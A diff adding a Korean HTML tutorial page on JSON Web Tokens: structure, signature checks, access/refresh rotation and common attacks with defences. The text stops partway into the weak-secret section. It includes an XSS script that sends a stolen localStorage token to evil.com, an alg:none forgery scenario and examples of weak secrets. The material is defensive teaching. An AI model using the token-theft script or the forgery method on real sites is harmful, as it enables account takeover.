@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JWT 완전 정복 — 동작 원리부터 보안까지</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700;900&family=JetBrains+Mono:wght@400;500;700&family=Oswald:wght@600;700&display=swap');
+:root {
+  --bg:#05060e; --surf:#090b16; --surf2:#0c0f1c; --border:#141828;
+  --text:#dde8ff; --dim:#5d72a0; --muted:#222e48;
+  --jwt:#8b5cf6; --jwtd:rgba(139,92,246,0.10); --jwtb:rgba(139,92,246,0.20);
+  --head:#fb923c; --headd:rgba(251,146,60,0.10);
+  --pay:#10b981;  --payd:rgba(16,185,129,0.10);
+  --sig:#8b5cf6;
+  --good:#4ade80; --warn:#fbbf24; --bad:#f87171; --info:#60a5fa;
+  --mono:'JetBrains Mono',monospace;
+  --display:'Oswald',sans-serif;
+  --sans:'Noto Sans KR',sans-serif;
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+body{font-family:var(--sans);background:var(--bg);color:var(--text);overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;
+  background:
+    radial-gradient(ellipse 60% 50% at 20% 10%, rgba(139,92,246,.06) 0%,transparent 55%),
+    radial-gradient(ellipse 50% 40% at 80% 90%, rgba(16,185,129,.04) 0%,transparent 55%);
+  pointer-events:none;z-index:0}
+body::after{content:'';position:fixed;inset:0;
+  background-image:
+    linear-gradient(rgba(139,92,246,0.018) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(139,92,246,0.018) 1px,transparent 1px);
+  background-size:52px 52px;pointer-events:none;z-index:0}
+.wrap{max-width:1000px;margin:0 auto;padding:56px 20px 100px;position:relative;z-index:1}
+
+/* ── Hero ── */
+.hero{text-align:center;margin-bottom:72px}
+.hero-eyebrow{font-family:var(--mono);font-size:10px;letter-spacing:6px;text-transform:uppercase;color:var(--muted);margin-bottom:18px;opacity:0;animation:up .5s ease forwards .1s}
+.hero h1{font-family:var(--display);font-size:clamp(48px,9vw,96px);font-weight:700;line-height:1.3;letter-spacing:3px;margin-bottom:16px;opacity:0;animation:up .5s ease forwards .25s;color:var(--jwt)}
+.hero-sub{font-size:14px;color:var(--dim);line-height:1.9;max-width:520px;margin:0 auto 0;opacity:0;animation:up .5s ease forwards .4s}
+
+/* ── Section ── */
+.section{margin-bottom:72px;opacity:0;animation:up .5s ease forwards}
+.s1{animation-delay:.5s}.s2{animation-delay:.58s}.s3{animation-delay:.64s}
+.s4{animation-delay:.70s}.s5{animation-delay:.76s}.s6{animation-delay:.82s}.s7{animation-delay:.88s}
+.sec-label{font-family:var(--mono);font-size:10px;letter-spacing:4px;text-transform:uppercase;color:var(--muted);margin-bottom:6px}
+.sec-title{font-family:var(--display);font-size:clamp(20px,3.5vw,30px);font-weight:700;letter-spacing:1px;margin-bottom:8px;line-height:1.35;display:flex;align-items:center;gap:12px}
+.sec-title .bar{width:3px;height:28px;border-radius:2px;flex-shrink:0;background:linear-gradient(to bottom,var(--jwt),var(--pay))}
+.sec-desc{font-size:13px;color:var(--dim);line-height:1.8;margin-bottom:24px}
+
+/* ── Code ── */
+.code-box{background:#020408;border:1px solid var(--border);border-radius:12px;padding:16px 20px;font-family:var(--mono);font-size:12px;line-height:1.95;overflow-x:auto}
+.code-box.sm{font-size:11px;padding:12px 16px}
+.ch{color:var(--head)}.cp{color:var(--pay)}.cs{color:var(--jwt)}
+.ck{color:#93c5fd}.cv{color:#fde68a}.cstr{color:#86efac}.cmt{color:var(--muted)}
+.cok{color:var(--good)}.cerr{color:var(--bad)}.cwarn{color:var(--warn)}.cinfo{color:var(--info)}
+
+/* ── JWT 구조 시각화 ── */
+.token-display{font-family:var(--mono);font-size:12.5px;line-height:1.7;word-break:break-all;padding:20px 22px;border-radius:12px;background:#020408;border:1px solid var(--border);margin-bottom:20px}
+.t-head{color:var(--head)}.t-pay{color:var(--pay)}.t-sig{color:var(--jwt)}.t-dot{color:var(--muted)}
+
+.parts-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:16px}
+@media(max-width:640px){.parts-grid{grid-template-columns:1fr}}
+.part-card{border-radius:12px;padding:18px}
+.part-head{background:rgba(251,146,60,.08);border:1px solid rgba(251,146,60,.25)}
+.part-pay {background:rgba(16,185,129,.08); border:1px solid rgba(16,185,129,.25)}
+.part-sig {background:rgba(139,92,246,.08); border:1px solid rgba(139,92,246,.25)}
+.part-label{font-family:var(--mono);font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px}
+
+.info-row{display:flex;gap:8px;padding:5px 0;font-size:12px;border-bottom:1px solid rgba(255,255,255,.04)}
+.info-row:last-child{border-bottom:none}
+.ir-key{color:var(--dim);flex-shrink:0;width:100px;font-family:var(--mono);font-size:11px}
+.ir-val{color:var(--text);line-height:1.5}
+
+/* ── 동작 흐름 ── */
+.flow-wrap{position:relative}
+.flow-line{position:absolute;left:28px;top:0;bottom:0;width:1px;background:linear-gradient(to bottom,var(--jwtb),transparent);z-index:0}
+.flow-steps{display:flex;flex-direction:column;gap:0;position:relative;z-index:1}
+.fstep{display:flex;gap:18px;margin-bottom:4px}
+.fstep-n{width:56px;height:56px;border-radius:50%;border:2px solid var(--jwt);background:var(--bg);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-family:var(--display);font-size:18px;font-weight:700;color:var(--jwt);z-index:1}
+.fstep-body{flex:1;padding-bottom:32px}
+.fstep-title{font-size:14px;font-weight:700;margin-bottom:6px;color:var(--text)}
+.fstep-desc{font-size:12.5px;color:var(--dim);line-height:1.75;margin-bottom:10px}
+
+/* ── Signature 검증 시각화 ── */
+.verify-vis{border-radius:14px;border:1px solid var(--border);overflow:hidden;background:var(--surf)}
+.vv-head{background:var(--surf2);padding:12px 20px;border-bottom:1px solid var(--border);font-family:var(--mono);font-size:11px;color:var(--dim)}
+.vv-body{padding:20px;display:grid;grid-template-columns:1fr auto 1fr;gap:16px;align-items:center}
+@media(max-width:580px){.vv-body{grid-template-columns:1fr}}
+.vv-col{border-radius:10px;padding:16px}
+.vv-arrow{font-size:24px;color:var(--muted);text-align:center;flex-shrink:0}
+.vv-label{font-family:var(--mono);font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px}
+
+/* ── 보안 이슈 카드 ── */
+.security-sections{display:flex;flex-direction:column;gap:28px}
+.sec-issue{border-radius:16px;border:1px solid;overflow:hidden}
+.si-head{padding:18px 22px;display:flex;align-items:flex-start;gap:14px;border-bottom:1px solid rgba(255,255,255,.06)}
+.si-icon{font-size:28px;flex-shrink:0;margin-top:2px}
+.si-head-text h3{font-size:15px;font-weight:700;margin-bottom:4px}
+.si-head-text p{font-size:12.5px;color:var(--dim);line-height:1.7}
+.si-body{display:grid;grid-template-columns:1fr 1fr;gap:0}
+@media(max-width:600px){.si-body{grid-template-columns:1fr}}
+.si-attack{padding:18px 22px;border-right:1px solid rgba(255,255,255,.06)}
+.si-defend{padding:18px 22px}
+.si-sub{font-family:var(--mono);font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px}
+
+.issue-red   {border-color:rgba(248,113,113,.25);background:rgba(248,113,113,.03)}
+.issue-red .si-head{background:rgba(248,113,113,.06)}
+.issue-red .si-sub.attack{color:var(--bad)}
+.issue-orange{border-color:rgba(251,146,60,.25); background:rgba(251,146,60,.03)}
+.issue-orange .si-head{background:rgba(251,146,60,.06)}
+.issue-orange .si-sub.attack{color:var(--warn)}
+.issue-blue  {border-color:rgba(96,165,250,.25);  background:rgba(96,165,250,.03)}
+.issue-blue .si-head{background:rgba(96,165,250,.06)}
+.issue-blue .si-sub.attack{color:var(--info)}
+.issue-purple{border-color:rgba(139,92,246,.25);  background:rgba(139,92,246,.03)}
+.issue-purple .si-head{background:rgba(139,92,246,.06)}
+.issue-purple .si-sub.attack{color:var(--jwt)}
+
+.si-sub.defend{color:var(--good)}
+.defend-list{display:flex;flex-direction:column;gap:6px}
+.defend-item{font-size:12px;color:var(--dim);line-height:1.7;display:flex;gap:8px}
+.defend-item::before{content:'✓';color:var(--good);flex-shrink:0;font-weight:700}
+
+/* ── Access/Refresh 전략 ── */
+.ar-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px}
+@media(max-width:600px){.ar-grid{grid-template-columns:1fr}}
+.ar-card{border-radius:12px;padding:20px;border:1px solid}
+.ar-access{border-color:rgba(96,165,250,.3);background:rgba(96,165,250,.06)}
+.ar-refresh{border-color:rgba(139,92,246,.3);background:rgba(139,92,246,.06)}
+.ar-title{font-family:var(--display);font-size:18px;font-weight:700;letter-spacing:1px;margin-bottom:12px;line-height:1.4}
+
+/* ── Rotation 다이어그램 ── */
+.rotation-flow{background:var(--surf);border:1px solid var(--border);border-radius:14px;padding:22px}
+.rf-steps{display:flex;flex-direction:column;gap:10px}
+.rf-step{display:flex;gap:12px;align-items:flex-start;padding:12px 14px;border-radius:10px;background:rgba(255,255,255,.02);border:1px solid var(--border)}
+.rf-num{font-family:var(--display);font-size:16px;font-weight:700;color:var(--jwt);flex-shrink:0;width:24px;line-height:1.4}
+.rf-text{font-size:12.5px;line-height:1.7}
+.rf-highlight{background:rgba(139,92,246,.12);border-color:rgba(139,92,246,.3)}
+.rf-danger{background:rgba(248,113,113,.08);border-color:rgba(248,113,113,.3)}
+
+/* ── 알고리즘 비교 ── */
+.algo-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+@media(max-width:600px){.algo-grid{grid-template-columns:1fr}}
+.algo-card{border-radius:12px;padding:20px;border:1px solid var(--border);background:var(--surf)}
+.algo-name{font-family:var(--display);font-size:20px;font-weight:700;letter-spacing:1px;margin-bottom:10px;line-height:1.4}
+
+/* ── 체크리스트 ── */
+.checklist{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media(max-width:580px){.checklist{grid-template-columns:1fr}}
+.cl-item{display:flex;gap:10px;align-items:flex-start;padding:12px 14px;border-radius:10px;background:var(--surf);border:1px solid var(--border);font-size:12.5px;line-height:1.7}
+.cl-icon{flex-shrink:0;font-size:16px}
+
+@keyframes up{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<!-- ── Hero ── -->
+<div class="hero">
+  <p class="hero-eyebrow">JSON Web Token · 동작 원리 · 보안 완전 정복</p>
+  <h1>JWT</h1>
+  <p class="hero-sub">구조 해부부터 서명 검증 원리, XSS·탈취·alg:none 공격 대응, Access/Refresh Token Rotation 전략까지</p>
+</div>
+
+<!-- ════════════════
+  1. JWT 구조
+════════════════ -->
+<div class="section s1">
+  <div class="sec-label">Section 01</div>
+  <div class="sec-title"><div class="bar"></div>JWT 구조 해부</div>
+  <div class="sec-desc">JWT는 점(.)으로 구분된 3개의 Base64URL 인코딩 문자열입니다. 암호화가 아닌 <strong style="color:var(--text)">서명(Signature)</strong>으로 위변조를 방지합니다.</div>
+
+  <div class="token-display">
+    <span class="t-head">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="t-dot">.</span><span class="t-pay">eyJzdWIiOiI0MiIsImVtYWlsIjoia2lsaWFuQGV4YW1wbGUuY29tIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjE3MDAwMDM2MDB9</span><span class="t-dot">.</span><span class="t-sig">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+  </div>
+
+  <div class="parts-grid">
+    <div class="part-card part-head">
+      <div class="part-label" style="color:var(--head)">① Header</div>
+      <div class="code-box sm">
+{
+  <span class="ck">"alg"</span>: <span class="cstr">"HS256"</span>,
+  <span class="ck">"typ"</span>: <span class="cstr">"JWT"</span>
+}
+      </div>
+      <div style="margin-top:10px;font-size:11.5px;color:var(--dim);line-height:1.75">
+        서명 알고리즘과 토큰 타입을 명시합니다.<br>
+        <span style="color:var(--warn)">alg 값은 서버에서 반드시 화이트리스트 검증 필요</span>
+      </div>
+    </div>
+    <div class="part-card part-pay">
+      <div class="part-label" style="color:var(--pay)">② Payload (Claims)</div>
+      <div class="code-box sm">
+{
+  <span class="ck">"sub"</span>:   <span class="cstr">"42"</span>,
+  <span class="ck">"email"</span>: <span class="cstr">"kilian@.."</span>,
+  <span class="ck">"role"</span>:  <span class="cstr">"admin"</span>,
+  <span class="ck">"iat"</span>:   <span class="cv">1700000000</span>,
+  <span class="ck">"exp"</span>:   <span class="cv">1700003600</span>
+}
+      </div>
+      <div style="margin-top:10px;font-size:11.5px;color:var(--dim);line-height:1.75">
+        <span style="color:var(--bad)">Base64 디코딩으로 누구나 열람 가능</span><br>
+        비밀번호, 민감 정보 절대 저장 금지
+      </div>
+    </div>
+    <div class="part-card part-sig">
+      <div class="part-label" style="color:var(--jwt)">③ Signature</div>
+      <div class="code-box sm">
+HMAC_SHA256(
+  base64url(header)
+  + <span class="cstr">"."</span>
+  + base64url(payload),
+  <span class="cs">SECRET_KEY</span>
+)
+      </div>
+      <div style="margin-top:10px;font-size:11.5px;color:var(--dim);line-height:1.75">
+        서버만 아는 비밀키로 생성한 서명<br>
+        Payload 1글자라도 바뀌면 서명 불일치
+      </div>
+    </div>
+  </div>
+
+  <!-- Claims 상세 -->
+  <div style="background:var(--surf);border:1px solid var(--border);border-radius:12px;padding:20px">
+    <div style="font-family:var(--mono);font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:2px;color:var(--muted);margin-bottom:14px">Registered Claims (표준 필드)</div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px">
+      <div class="info-row" style="border:1px solid var(--border);border-radius:8px;padding:10px 12px;background:rgba(0,0,0,.2)">
+        <div class="ir-key">sub</div><div class="ir-val">주체 (사용자 ID)</div>
+      </div>
+      <div class="info-row" style="border:1px solid var(--border);border-radius:8px;padding:10px 12px;background:rgba(0,0,0,.2)">
+        <div class="ir-key">iss</div><div class="ir-val">발급자 (서버 URL)</div>
+      </div>
+      <div class="info-row" style="border:1px solid var(--border);border-radius:8px;padding:10px 12px;background:rgba(0,0,0,.2)">
+        <div class="ir-key">aud</div><div class="ir-val">대상 (수신자)</div>
+      </div>
+      <div class="info-row" style="border:1px solid var(--border);border-radius:8px;padding:10px 12px;background:rgba(0,0,0,.2)">
+        <div class="ir-key" style="color:var(--warn)">exp</div><div class="ir-val" style="color:var(--warn)">만료 시간 (Unix)</div>
+      </div>
+      <div class="info-row" style="border:1px solid var(--border);border-radius:8px;padding:10px 12px;background:rgba(0,0,0,.2)">
+        <div class="ir-key">iat</div><div class="ir-val">발급 시간 (Unix)</div>
+      </div>
+      <div class="info-row" style="border:1px solid var(--border);border-radius:8px;padding:10px 12px;background:rgba(0,0,0,.2)">
+        <div class="ir-key">nbf</div><div class="ir-val">활성 시작 시간</div>
+      </div>
+      <div class="info-row" style="border:1px solid var(--border);border-radius:8px;padding:10px 12px;background:rgba(0,0,0,.2)">
+        <div class="ir-key">jti</div><div class="ir-val">JWT 고유 ID</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════════
+  2. 서명 검증 원리
+════════════════ -->
+<div class="section s2">
+  <div class="sec-label">Section 02</div>
+  <div class="sec-title"><div class="bar"></div>서명 검증 원리</div>
+  <div class="sec-desc">서버가 토큰을 어떻게 신뢰하는가 — 저장소 조회 없이 수학적으로 위변조를 탐지합니다.</div>
+
+  <div class="verify-vis">
+    <div class="vv-head">서버의 JWT 검증 과정</div>
+    <div class="vv-body">
+      <div class="vv-col" style="background:rgba(251,146,60,.06);border:1px solid rgba(251,146,60,.2);border-radius:10px;padding:18px">
+        <div class="vv-label" style="color:var(--head)">클라이언트가 보낸 토큰</div>
+        <div class="code-box sm" style="margin-bottom:10px">
+<span class="ch">eyJhbGci...헤더</span>.<span class="cp">eyJzdWIi...페이로드</span>.<span class="cs">SflKxw...서명</span>
+        </div>
+        <div style="font-size:11.5px;color:var(--dim);line-height:1.7">
+          ① 헤더에서 알고리즘 추출<br>
+          ② 페이로드에서 exp 확인 (만료 검사)
+        </div>
+      </div>
+
+      <div class="vv-arrow">⟵ 비교 ⟶</div>
+
+      <div class="vv-col" style="background:rgba(139,92,246,.06);border:1px solid rgba(139,92,246,.2);border-radius:10px;padding:18px">
+        <div class="vv-label" style="color:var(--jwt)">서버가 재계산한 서명</div>
+        <div class="code-box sm" style="margin-bottom:10px">
+HMAC_SHA256(
+  <span class="ch">헤더</span> + "." + <span class="cp">페이로드</span>,
+  <span class="cs">SECRET_KEY</span>
+) = <span class="cs">SflKxw...?</span>
+        </div>
+        <div style="font-size:11.5px;color:var(--dim);line-height:1.7">
+          ③ 서버 비밀키로 서명 재계산<br>
+          ④ 클라이언트 서명과 일치 여부 확인
+        </div>
+      </div>
+    </div>
+    <div style="padding:14px 20px;border-top:1px solid var(--border);display:grid;grid-template-columns:1fr 1fr;gap:12px">
+      <div style="padding:12px 14px;background:rgba(74,222,128,.06);border:1px solid rgba(74,222,128,.2);border-radius:8px;font-size:12px;color:var(--dim)">
+        <strong style="color:var(--good)">✓ 서명 일치 + 만료 안됨</strong><br>
+        Payload에서 사용자 정보 추출 → 요청 처리
+      </div>
+      <div style="padding:12px 14px;background:rgba(248,113,113,.06);border:1px solid rgba(248,113,113,.2);border-radius:8px;font-size:12px;color:var(--dim)">
+        <strong style="color:var(--bad)">✗ 서명 불일치 or 만료</strong><br>
+        401 Unauthorized 반환 → 재로그인 또는 Refresh
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════════
+  3. 전체 동작 흐름
+════════════════ -->
+<div class="section s3">
+  <div class="sec-label">Section 03</div>
+  <div class="sec-title"><div class="bar"></div>전체 동작 흐름</div>
+  <div class="sec-desc">로그인부터 토큰 갱신, 로그아웃까지 JWT 기반 인증의 전체 사이클</div>
+
+  <div class="flow-wrap">
+    <div class="flow-line"></div>
+    <div class="flow-steps">
+
+      <div class="fstep">
+        <div class="fstep-n">1</div>
+        <div class="fstep-body">
+          <div class="fstep-title">로그인 요청</div>
+          <div class="fstep-desc">클라이언트가 ID/PW를 서버로 전송합니다.</div>
+          <div class="code-box sm">POST /auth/login
+Content-Type: application/json
+{ <span class="ck">"email"</span>: <span class="cstr">"kilian@example.com"</span>, <span class="ck">"password"</span>: <span class="cstr">"***"</span> }</div>
+        </div>
+      </div>
+
+      <div class="fstep">
+        <div class="fstep-n">2</div>
+        <div class="fstep-body">
+          <div class="fstep-title">서버 — 토큰 발급</div>
+          <div class="fstep-desc">인증 성공 시 AccessToken(짧은 만료)과 RefreshToken(긴 만료)을 발급합니다. 서버에는 아무것도 저장하지 않습니다.</div>
+          <div class="code-box sm">
+<span class="cmt"># AccessToken — 짧은 만료 (5~15분)</span>
+accessToken = sign({sub:<span class="cv">42</span>, role:<span class="cstr">"admin"</span>, exp: now+900}, <span class="cs">SECRET</span>)
+
+<span class="cmt"># RefreshToken — 긴 만료 (7~30일)</span>
+refreshToken = sign({sub:<span class="cv">42</span>, jti:<span class="cstr">"uuid-1234"</span>, exp: now+604800}, <span class="cs">SECRET</span>)
+
+HTTP/1.1 200 OK
+<span class="cmt"># AccessToken → Response Body</span>
+{ <span class="ck">"accessToken"</span>: <span class="cs">"eyJ..."</span> }
+<span class="cmt"># RefreshToken → HttpOnly 쿠키</span>
+Set-Cookie: <span class="cs">refreshToken=eyJ...</span>; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
+          </div>
+        </div>
+      </div>
+
+      <div class="fstep">
+        <div class="fstep-n">3</div>
+        <div class="fstep-body">
+          <div class="fstep-title">클라이언트 — 토큰 저장</div>
+          <div class="fstep-desc">AccessToken은 JS 메모리(변수/상태)에만 저장합니다. localStorage는 XSS에 취약해서 사용하지 않습니다.</div>
+          <div class="code-box sm">
+<span class="cmt"># ✅ AccessToken → 메모리 (React state, 전역변수)</span>
+<span class="ck">const</span> [accessToken, setAccessToken] = useState(<span class="cstr">"eyJ..."</span>)
+
+<span class="cmt"># ✅ RefreshToken → 서버가 HttpOnly 쿠키로 자동 저장</span>
+<span class="cmt"># (JS에서 접근 불가, 브라우저가 관리)</span>
+
+<span class="cmt"># ❌ 절대 금지</span>
+localStorage.setItem(<span class="cerr">"accessToken"</span>, <span class="cerr">"eyJ..."</span>)
+          </div>
+        </div>
+      </div>
+
+      <div class="fstep">
+        <div class="fstep-n">4</div>
+        <div class="fstep-body">
+          <div class="fstep-title">API 요청 — Bearer 토큰 전송</div>
+          <div class="fstep-desc">요청마다 메모리의 AccessToken을 Authorization 헤더에 수동으로 첨부합니다. 서버는 DB 조회 없이 서명만 검증합니다.</div>
+          <div class="code-box sm">
+GET /api/my-data
+Authorization: Bearer <span class="cs">eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiJ9.xxx</span>
+
+<span class="cmt"># 서버 처리 (DB 조회 없음)</span>
+① 서명 검증 → ② exp 확인 → ③ payload에서 userId 추출 → ④ 응답
+          </div>
+        </div>
+      </div>
+
+      <div class="fstep">
+        <div class="fstep-n">5</div>
+        <div class="fstep-body">
+          <div class="fstep-title">AccessToken 만료 → Silent Refresh</div>
+          <div class="fstep-desc">401 응답을 받으면 클라이언트가 자동으로 RefreshToken으로 새 AccessToken을 재발급받고 원래 요청을 재시도합니다.</div>
+          <div class="code-box sm">
+<span class="cmt"># 1. API 요청 → 401 (AccessToken 만료)</span>
+GET /api/my-data → <span class="cerr">401 Unauthorized</span>
+
+<span class="cmt"># 2. RefreshToken으로 재발급 요청</span>
+<span class="cmt">#    (HttpOnly 쿠키라 자동으로 전송됨)</span>
+POST /auth/refresh
+Cookie: <span class="cs">refreshToken=eyJ...</span>  ← 브라우저 자동 첨부
+
+<span class="cmt"># 3. 서버 응답</span>
+{ <span class="ck">"accessToken"</span>: <span class="cok">"eyJ...새토큰"</span> }  ← 메모리 업데이트
+Set-Cookie: <span class="cs">refreshToken=eyJ...새리프레시</span>  ← Rotation
+
+<span class="cmt"># 4. 원래 요청 재시도</span>
+GET /api/my-data → <span class="cok">200 OK</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="fstep">
+        <div class="fstep-n">6</div>
+        <div class="fstep-body" style="padding-bottom:0">
+          <div class="fstep-title">앱 시작 시 — Silent Refresh</div>
+          <div class="fstep-desc">새로고침 시 메모리가 초기화되므로, 앱 로드 직후 RefreshToken 쿠키로 AccessToken을 복구합니다.</div>
+          <div class="code-box sm">
+<span class="cmt"># 앱 초기화 시 (useEffect, main.js 등)</span>
+<span class="ck">async function</span> initAuth() {
+  <span class="ck">try</span> {
+    <span class="cmt"># RefreshToken 쿠키 자동 전송</span>
+    <span class="ck">const</span> { accessToken } = <span class="ck">await</span> POST(<span class="cstr">"/auth/refresh"</span>)
+    setAccessToken(accessToken) <span class="cmt"># 메모리 복원</span>
+  } <span class="ck">catch</span> {
+    <span class="cmt"># RefreshToken도 만료 → 로그인 페이지</span>
+    redirect(<span class="cstr">"/login"</span>)
+  }
+}
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- ════════════════
+  4. 보안 이슈와 해결
+════════════════ -->
+<div class="section s4">
+  <div class="sec-label">Section 04</div>
+  <div class="sec-title"><div class="bar"></div>보안 이슈와 해결 방법</div>
+  <div class="sec-desc">JWT를 사용할 때 발생하는 4가지 핵심 보안 위협과 각 대응 전략</div>
+
+  <div class="security-sections">
+
+    <!-- XSS -->
+    <div class="sec-issue issue-red">
+      <div class="si-head">
+        <div class="si-icon">🔓</div>
+        <div class="si-head-text">
+          <h3>토큰 탈취 — XSS (Cross-Site Scripting)</h3>
+          <p>악성 스크립트를 페이지에 주입해 JS로 토큰을 훔치는 공격. localStorage에 저장된 토큰은 단 한 줄의 코드로 탈취됩니다.</p>
+        </div>
+      </div>
+      <div class="si-body">
+        <div class="si-attack">
+          <div class="si-sub attack">공격 시나리오</div>
+          <div class="code-box sm">
+<span class="cmt"># 공격자가 게시판 댓글에 삽입한 스크립트</span>
+&lt;script&gt;
+  <span class="cmt"># localStorage에 토큰이 있으면 즉시 탈취</span>
+  <span class="cerr">fetch</span>(<span class="cstr">'https://evil.com/steal?t='</span>
+    + localStorage.getItem(<span class="cerr">'accessToken'</span>))
+&lt;/script&gt;
+
+<span class="cmt"># 피해자가 페이지를 보는 순간 토큰 전송됨</span>
+<span class="cmt"># 공격자는 탈취한 토큰으로 API 자유 호출</span>
+          </div>
+        </div>
+        <div class="si-defend">
+          <div class="si-sub defend">방어 전략</div>
+          <div class="defend-list">
+            <div class="defend-item">AccessToken을 <strong style="color:var(--text)">메모리(JS 변수)</strong>에만 저장 — localStorage/sessionStorage 금지</div>
+            <div class="defend-item">RefreshToken은 <strong style="color:var(--text)">HttpOnly 쿠키</strong>에 저장 — JS 접근 원천 차단</div>
+            <div class="defend-item"><strong style="color:var(--text)">Content-Security-Policy</strong> 헤더로 외부 스크립트 실행 제한</div>
+            <div class="defend-item">사용자 입력값 <strong style="color:var(--text)">HTML 이스케이프</strong> 처리 (DOMPurify 등)</div>
+            <div class="defend-item">AccessToken <strong style="color:var(--text)">만료를 짧게</strong> — 탈취돼도 피해 시간 최소화</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 토큰 무효화 -->
+    <div class="sec-issue issue-orange">
+      <div class="si-head">
+        <div class="si-icon">🔄</div>
+        <div class="si-head-text">
+          <h3>즉시 로그아웃 불가 — Stateless의 딜레마</h3>
+          <p>JWT는 서버에 저장되지 않아 발급된 토큰을 취소할 방법이 없습니다. 강제 로그아웃, 권한 박탈, 탈취 대응이 즉시 불가합니다.</p>
+        </div>
+      </div>
+      <div class="si-body">
+        <div class="si-attack">
+          <div class="si-sub attack">문제 상황</div>
+          <div class="code-box sm">
+<span class="cmt"># 시나리오: 관리자 권한 즉시 박탈</span>
+DB에서 role = "user"로 변경 → <span class="cerr">반영 안됨</span>
+기존 JWT에는 role: "admin" 그대로 존재
+→ 만료될 때까지 관리자 API 접근 가능
+
+<span class="cmt"># 시나리오: 토큰 탈취 감지 후 차단</span>
+보안팀이 userId=42 강제 로그아웃 실행
+→ <span class="cerr">서버에 저장된 게 없어서 차단 불가</span>
+→ 남은 만료 시간 동안 공격자 활동 가능
+          </div>
+        </div>
+        <div class="si-defend">
+          <div class="si-sub defend">방어 전략</div>
+          <div class="defend-list">
+            <div class="defend-item"><strong style="color:var(--text)">AccessToken 만료를 5~15분</strong>으로 짧게 — 탈취 피해 시간 제한</div>
+            <div class="defend-item"><strong style="color:var(--text)">블랙리스트 DB</strong> 운용 — 무효화할 jti를 Redis에 저장하고 요청마다 조회 (Stateful이 됨)</div>
+            <div class="defend-item"><strong style="color:var(--text)">Token Version</strong> 패턴 — DB에 tokenVersion 컬럼 추가, 로그아웃 시 버전 증가, JWT의 버전과 비교</div>
+            <div class="defend-item">완전한 즉시 무효화가 필요하면 <strong style="color:var(--text)">세션 방식</strong>이 더 적합할 수 있음</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- alg:none 공격 -->
+    <div class="sec-issue issue-blue">
+      <div class="si-head">
+        <div class="si-icon">🎭</div>
+        <div class="si-head-text">
+          <h3>alg:none 공격 — 서명 우회</h3>
+          <p>Header의 alg 값을 "none"으로 변조하면, 서명 검증을 건너뛰는 취약한 서버에서 위조 토큰이 그대로 통과됩니다.</p>
+        </div>
+      </div>
+      <div class="si-body">
+        <div class="si-attack">
+          <div class="si-sub attack">공격 시나리오</div>
+          <div class="code-box sm">
+<span class="cmt"># 1. 정상 토큰 발급받음</span>
+{ alg: "HS256" }.{ role: "user" }.서명
+
+<span class="cmt"># 2. 공격자가 Header/Payload를 직접 조작</span>
+{ <span class="cerr">alg: "none"</span> }.{ role: <span class="cerr">"admin"</span> }.<span class="cmt">(서명 없음)</span>
+
+<span class="cmt"># 3. 취약한 서버의 처리</span>
+alg가 none이니 서명 검증 스킵...
+→ <span class="cerr">위조된 admin 토큰이 통과!</span>
+          </div>
+        </div>
+        <div class="si-defend">
+          <div class="si-sub defend">방어 전략</div>
+          <div class="defend-list">
+            <div class="defend-item">서버에서 <strong style="color:var(--text)">허용 알고리즘 화이트리스트</strong> 명시 — alg를 토큰에서 읽지 말고 서버에 고정</div>
+            <div class="defend-item"><code style="font-family:var(--mono);font-size:10px">alg: none</code> 및 빈 서명 <strong style="color:var(--text)">명시적 거부</strong></div>
+            <div class="defend-item">최신 버전의 <strong style="color:var(--text)">검증된 JWT 라이브러리</strong> 사용 (직접 파싱 금지)</div>
+          </div>
+          <div class="code-box sm" style="margin-top:10px">
+<span class="cmt"># ✅ 올바른 서버 검증 (예: Node.js)</span>
+jwt.verify(token, SECRET, {
+  <span class="ck">algorithms</span>: [<span class="cstr">'HS256'</span>] <span class="cmt">← 허용 알고리즘 고정</span>
+})
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 약한 Secret -->
+    <div class="sec-issue issue-purple">
+      <div class="si-head">
+        <div class="si-icon">🔑</div>
+        <div class="si-head-text">
+          <h3>약한 Secret Key — 브루트포스 위조</h3>
+          <p>HS256은 대칭키 알고리즘이라 비밀키가 짧거나 단순하면 오프라인 브루트포스 공격으로 서명을 위조할 수 있습니다.</p>
+        </div>
+      </div>
+      <div class="si-body">
+        <div class="si-attack">
+          <div class="si-sub attack">공격 시나리오</div>
+          <div class="code-box sm">
+<span class="cmt"># 약한 비밀키 사용 예시</span>
+SECRET = <span class="cerr">"secret"</span>      <span class="cmt">← 즉시 크랙 가능</span>
+SECRET = <span class="cerr">"password123"</span>  <span class="cmt">← 딕셔너리 공격</span>
